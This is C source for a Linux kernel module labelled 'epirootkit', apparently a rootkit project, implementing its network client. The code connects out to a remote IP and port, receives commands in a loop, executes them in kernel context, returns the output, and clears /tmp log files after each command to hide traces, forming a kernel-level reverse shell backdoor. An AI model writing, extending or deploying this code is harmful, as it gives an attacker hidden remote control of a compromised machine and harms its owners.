#include <linux/module.h>
#include <linux/net.h>
#include <linux/inet.h>
#include <linux/delay.h>

#include "client.h"
#include "../commands/commands.h"

static void *convert(void *ptr)
{
    return ptr;
}

int connect_server(char *ip, int port, char *message)
{
    int socket_alive;
    struct kvec vec = { 0 };
    struct kvec recv_vec = { 0 };
    struct kvec cmd_vec = { 0 };
    
    struct msghdr msg = { 0 };
    struct socket *sock = NULL;
    struct sockaddr_in addr = { 0 };

    unsigned char ip_binary[4] = { 0 };
    char recv_buffer[BUFFER_SIZE] = { 0 };
    char *resp = NULL;
    int ret = 0;
    
    if ((ret = in4_pton(ip, -1, ip_binary, -1, NULL)) == 0)
    {
        pr_err("[epirootkit]: error converting the IPv4 address: %d\n", ret);
        sock_release(sock);
        return 1;
    }

    if ((ret = sock_create(AF_INET, SOCK_STREAM, IPPROTO_TCP, &sock)) < 0)
    {
        pr_err("[epirootkit]: error creating the socket: %d\n", ret);
        sock_release(sock);
        return 1;
    }
    
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    memcpy(&addr.sin_addr.s_addr, ip_binary, sizeof (addr.sin_addr.s_addr));

    if ((ret = sock->ops->connect(sock, convert(&addr), sizeof(addr), 0)) < 0)
    {
        pr_err("[epirootkit]: error connecting to %s:%d (%d)\n", ip, port, ret);
        sock_release(sock);
        return 1;
    }

    pr_info("[epirootkit]: successfully connected\n");

    socket_alive = 1;
    vec.iov_base = message;
    vec.iov_len = strlen(message);
    if ((ret = kernel_sendmsg(sock, &msg, &vec, 1, vec.iov_len)) < 0)
    {
        pr_err("[epirootkit]: error sending the message: %d\n", ret);
        sock_release(sock);
        return 1;
    }
    pr_info("[epirootkit]: message '%s' sent to %s:%d\n", message, ip, port);

    // As long as we are able to send messages we keep the connection alive
    while (1)
    {
        if (!socket_alive)
            break;
        ssleep(1);

        recv_vec.iov_base = recv_buffer;
        recv_vec.iov_len = sizeof(recv_buffer) - 1;

        ret = kernel_recvmsg(sock, &msg, &recv_vec, 1, sizeof(recv_buffer) - 1, 0);
        if (ret < 0)
        {
            pr_err("[epirootkit]: recv failed (%d)\n", ret);
            socket_alive = 0;
            break;
        }
        else
        {
            // Check contents of message -> if upload/download switch from command exec to file transfer
            // if shell or nothing then classic command exec
            // File transfer can be made in C or scp tunelling using commands but it requires to open ssh port
            pr_info("[epirootkit]: received command: %s\n", recv_buffer);
            resp = exec_command(recv_buffer);
            if (resp != NULL)
            {
                cmd_vec.iov_base = resp;
                cmd_vec.iov_len = strlen(resp);
    
                if ((ret = kernel_sendmsg(sock, &msg, &cmd_vec, 1, cmd_vec.iov_len)) < 0)
                {
                    pr_err("[epirootkit]: error sending the message: %d\n", ret);
                    socket_alive = 0;
                    break;
                }
                else
                {
                    pr_info("[epirootkit]: command result sent\n");
                }
                for (int i = 0; i <= recv_vec.iov_len; i++)
                {
                    recv_buffer[i] = 0;
                }
                // Between every command we delete the history of those files
                char cmd[] = "> /tmp/stdout.log && > /tmp/stderr.log";
                char *rm = kzalloc(strlen(cmd) + 1 * sizeof(char), GFP_KERNEL);
                rm = strncpy(rm, cmd, strlen(cmd));
                resp = exec_command(rm);
                kfree(rm);
            }
            else
            {
                socket_alive = 0;
            }
        }
    }

    pr_info("[epirootkit]: connection terminated with %s:%d\n", ip, port);
    kfree(resp);
    sock_release(sock);

    return 0;
}
